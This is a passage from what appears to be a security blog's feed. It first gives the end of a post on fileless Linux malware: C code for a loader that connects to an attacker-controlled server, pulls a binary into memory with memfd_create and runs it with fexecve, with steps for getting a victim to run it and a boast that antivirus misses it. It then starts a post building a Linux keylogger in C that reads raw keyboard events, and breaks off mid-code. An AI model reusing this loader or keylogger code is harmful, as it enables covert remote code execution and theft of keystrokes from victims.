</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>   <span class="c1"># Prints the incoming Connection details</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>Finally, we modify the previous local binary loader code to read from connected socket instead of a local binary.</p>
<p>Source code: <code>network_loader.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE         </span><span class="cm">/* See feature_test_macros(7) */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define BUFF_SIZE 1024
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">usage</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">prog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">use</span> <span class="o">=</span> <span class="s">&#34;USAGE: %1$s Destination Port ...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="n">use</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ - ] %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ ? ] %s&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">BUFF_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Create mem file (fd1)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ * ] Trying to create a mem file...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">fd1</span> <span class="o">=</span> <span class="nf">memfd_create</span><span class="p">(</span><span class="s">&#34;testfd&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Can&#39;t create memfd file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Created mem file and attached to fd = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Socket stuff begins here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">sock</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Socket not created&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="nf">htons</span><span class="p">(</span><span class="nf">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">10</span><span class="p">));</span>   <span class="c1">// set port
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nf">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">0</span><span class="p">)</span>  <span class="c1">// set address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Invalid address&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// connect
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">die</span><span class="p">(</span><span class="s">&#34;Connection failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">read_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">write_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="p">(</span><span class="n">read_count</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span> <span class="n">sock</span> <span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">BUFF_SIZE</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">write_count</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">read_count</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  		<span class="nf">die</span><span class="p">(</span><span class="s">&#34;Failed to write to mem file&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  	<span class="n">i</span> <span class="o">+=</span> <span class="n">read_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  	<span class="n">j</span> <span class="o">+=</span> <span class="n">write_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\r</span><span class="s">Read count = %6d  |  Write count = %3d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s"> ----------------------------------- </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ + ] Starting execution...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Change argv params
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// printf(&#34;BEFORE:  %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  	<span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// printf(&#34;AFTER:   %s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Execute fd1 - with new argv
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">fexecve</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// If fexecve returns, then it is failed.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed Executing....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Compile it &ndash;&gt; <code>gcc network_loader.c -o network_loader.o</code></p>
<p>With this, we have everything ready with us. Some more steps and we are done.</p>
<ol>
<li>Start the python server on attacker&rsquo;s machine. - <code>python3 python_server.py</code></li>
<li>Place the <code>network_loader.o</code> on victim&rsquo;s machine.</li>
<li>Politely ask the victim to execute the binary - <code>./network_loader.o 192.168.56.56 1234</code></li>
<li>Sit back and enjoy!</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## On Attacker&#39;s machine</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">python3</span> <span class="n">python_server</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">16800</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">family</span><span class="o">=</span><span class="n">AddressFamily</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="n">SocketKind</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">laddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">),</span> <span class="n">raddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## on victim&#39;s machine</span>
</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="o">./</span><span class="n">network_loader</span><span class="o">.</span><span class="n">o</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.56</span> <span class="mi">1234</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>  
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">16800</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">16800</span>
</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
</span></span></code></pre></div><p>And if we check the victim&rsquo;s working directory we can see a file with name <code>NOTICE_for_U.txt</code> there&hellip;. which confirms that the remote binary successfully ran on victim&rsquo;s machine.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/LpLd2NGvpaiys/giphy.gif" alt=""  />
</p>
<hr>
<p>Voila! We just executed a remotely located binary without leaving anytrace on harddisk for further analysis. What we have is a loader binary that reads unknown data from somewhere and just executes it. And there is nothing in the loader binary that could be detected as malicious by most of the automated analysis tools&hellip; even VirusTotal does not detect it for what it is.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/716/1*TSWENZxQ7unvU9Qwc3x3xQ.png" alt=""  />
</p>
<p><em><a href="https://nvd.nist.gov/vuln/detail/cve-2021-4034">CVE-2021-4038</a> describes as a local privilege escalation vulnerability that was found on polkit&rsquo;s pkexec utility. I&rsquo;m not sure if it is a false positive or based on similar signatures.</em></p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://lwn.net/Articles/631631/">How programs get run: ELF binaries</a> (lwn.net)</li>
<li><a href="https://tldp.org/LDP/tlk/mm/memory.html">Chapter 3 - Memory Management</a> (tldp.org)</li>
<li><a href="https://en.wikipedia.org/wiki/Fileless_malware">Fileless Malwares</a> (wikipedia.org)</li>
<li><a href="https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html">what is fileless malware</a> (norton.com)</li>
<li><a href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/">covert code faces a heap of trouble in memory</a> (sophos.com)</li>
<li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats">Intelligence: File less threats</a> (microsoft.com)</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Keylogger for Linux</title>
      <link>https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/</link>
      <pubDate>Tue, 02 Feb 2021 14:47:26 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2021/02/keylogger-for-linux/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Developing a low level keylogger for linux using C.&lt;/p&gt;
&lt;/blockquote&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Developing a low level keylogger for linux using C.</p>
</blockquote>
<p>I am putting this blog in a bottom-up approach. We&rsquo;ll start with the basic program that can act as a keylogger.</p>
<h3 id="what-is-a-keylogger-how-to-make-one">What is a Keylogger?? How to make one?</h3>
<blockquote>
<p>Keylogger is a program (or a hardware sometimes) that logs all the keystrokes made by the keyboard.</p>
</blockquote>
<p>We know that there is something in OS that listens to the keyboard events and perform actions accordingly. For example, when we press <em>alt+tab</em> it changes the current focus to another application/screen.</p>
<p>According to wikipedia, in linux, the <a href="https://en.wikipedia.org/wiki/Evdev">event devices</a> generalizes all the raw input from device drivers and makes them available through character devices in <code>/dev/input/</code> directory.</p>
<p><em>(If you don&rsquo;t know about <code>character devices</code>, think it as a real-time stream data)</em></p>
<p>All the event files/devices are located in <code>/dev/input/</code> directory. It was very easy to figure out the file after looking at the directory structure.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*X9cxcchj9h9vGjHKAtG_mg.png" alt="directory-structure"  />
</p>
<p>It is pretty obvious that my keyboard event file is <code>/dev/input/by-path/platform-i8042-serio-0-event-kbd</code>. (For you, this may change, but it&rsquo;ll have <strong>kbd</strong> in it&rsquo;s name!!)</p>
<p>So I wrote a program that will continuously read data from this file and print it on screen.</p>
<p>CODE - <code>basic_keylogger.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/input.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//This is the keyboard event file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="s">&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="c1">//read from keyboard
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%i - %i</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ev</span><span class="p">.</span><span class="n">code</span><span class="p">,</span> <span class="n">ev</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Compile this and run it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## Compile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gcc basic_keylogger.c -o basic_keylogger.out
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## Execute it
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./basic_keylogger.out
</span></span></code></pre></div><p>This will give output something like this.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*Y-Z4wh_4BDSNLf6v1_NF8Q.png" alt="output1"  />
</p>
<p>I am not sure about what this all is. But I saw some pattern and decided to learn more on this later. The pattern here is, whenever <code>ev.value</code> is <code>1</code> then I am getting a <code>ev.code</code> unique for each key. So I decided to just filter out the data with <code>ev.value == 1</code>.</p>
<p>CODE - <code>basic_keylogger.c</code> (minor modification)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/input.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//This is the keyboard event file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="s">&#34;/dev/input/by-path/platform-i8042-serio-0-event-kbd&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="c1">//read from keyboard
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="n">ev</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%i - %i</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">ev</span><span class="p">.</span><span class="n">code</span><span class="p">,</span> <span class="n">ev</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
